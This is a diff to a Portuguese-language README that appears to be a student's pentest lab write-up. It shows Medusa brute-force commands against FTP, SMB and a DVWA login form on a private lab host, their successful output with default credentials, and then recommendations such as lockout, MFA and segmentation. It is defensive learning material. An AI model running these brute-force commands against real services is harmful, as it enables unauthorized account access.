@@ -99,3 +99,52 @@ Seguindo a mesma lógica do FTP, o próximo alvo foi o serviço SMB, confirmado 
 Comando Executado:
 ```bash
 medusa -h 192.168.0.10 -U ./user.txt -P ./password.txt -M smbnt
+```
+Resultado (Evidência): O Medusa novamente obteve sucesso, confirmando que a mesma credencial padrão estava sendo reutilizada:
+```
+ACCOUNT FOUND: [smbnt] Host: 192.168.0.10 User: msfadmin Password: msfadmin
+```
+### ⚡Fase 4: Ataque de Força Bruta (Web - DVWA)
+A última fase foi direcionada a um formulário de login web na aplicação DVWA, rodando na porta 80.
+
+Comando Executado:
+```bash
+medusa -h 192.168.0.10 -U ./user.txt -P ./password.txt -M http -m FORM:"/dvwa/login.php" -m PARAMS:"username=^USER^&password=^PASS^&Login=Login"
+```
+Resultado (Evidência): O ataque foi bem-sucedido e encontrou múltiplas credenciais válidas, todas usando senhas fracas:
+```
+2025-11-07 21:25:40 ACCOUNT FOUND: [http] Host: 192.168.0.10 User: root Password: root [SUCCESS]
+2025-11-07 21:25:40 ACCOUNT FOUND: [http] Host: 192.168.0.10 User: admin Password: root [SUCCESS]
+2025-11-07 21:25:40 ACCOUNT FOUND: [http] Host: 192.168.0.10 User: msfadmin Password: root [SUCCESS]
+2025-11-07 21:25:40 ACCOUNT FOUND: [http] Host: 192.168.0.10 User: user Password: root [SUCCESS]
+```
+### 📈 Resultados e Evidências
+A auditoria de força bruta foi bem-sucedida em todos os três serviços testados. Os resultados estão consolidados na tabela abaixo, demonstrando um alto risco de reutilização de senhas e uso de credenciais padrão.
+```bash
+Serviço,Porta,Usuário(s) Encontrado(s),Senha(s) Encontrada(s)
+FTP,21,msfadmin,msfadmin
+SMB,445,msfadmin,msfadmin
+HTTP (DVWA),80,"root, admin, msfadmin, user",root (para todos)
+```
+### 🛡️ Mitigação e Recomendações
+Com base nas vulnerabilidades críticas encontradas, as seguintes medidas de segurança são recomendadas para corrigir as falhas e prevenir futuros ataques:
+
+Política de Senhas Fortes: Implementar uma política de senhas obrigatória que exija complexidade (maiúsculas, minúsculas, números e símbolos) e um comprimento mínimo de 12 a 16 caracteres.
+
+Remoção de Credenciais Padrão: A causa raiz de todos os acessos foi o uso de senhas padrão (msfadmin, root). A primeira ação após a instalação de qualquer sistema deve ser a troca imediata de todas as credenciais de fábrica.
+
+Implementação de Account Lockout: Configurar um bloqueio temporário de conta (ex: 15 minutos) após um número baixo de tentativas de login falhas (ex: 5 tentativas). Isso neutraliza a eficácia de ataques de força bruta.
+
+Autenticação Multifator (MFA): Para todos os serviços críticos, especialmente acessos web, implementar o MFA (Autenticação de Múltiplos Fatores) como uma camada de defesa adicional.
+
+Firewall e Segmentação de Rede: Serviços como FTP e SMB não deveriam, em circunstância alguma, estar expostos à internet pública. Eles devem ser protegidos por um firewall e acessíveis apenas por redes internas confiáveis ou via VPN.
+
+### 💡 Desafios e Aprendizados
+Durante este desafio, aprendi na prática o fluxo de trabalho de um pentest, desde o reconhecimento passivo com Nmap até a exploração ativa com o Medusa. O maior desafio foi entender a sintaxe correta para cada módulo, especialmente o módulo HTTP, que exigia parâmetros específicos. Este projeto reforçou a importância de não apenas encontrar uma falha, mas de saber documentá-la de forma clara e estruturada, como neste README.
+
+### 👤 Autor
+Pedro Henrique Ferrante
+
+GitHub: github.com/FerranteAbc
+
+LinkedIn: www.linkedin.com/in/pedro-henrique-ferrante-prado-128123230
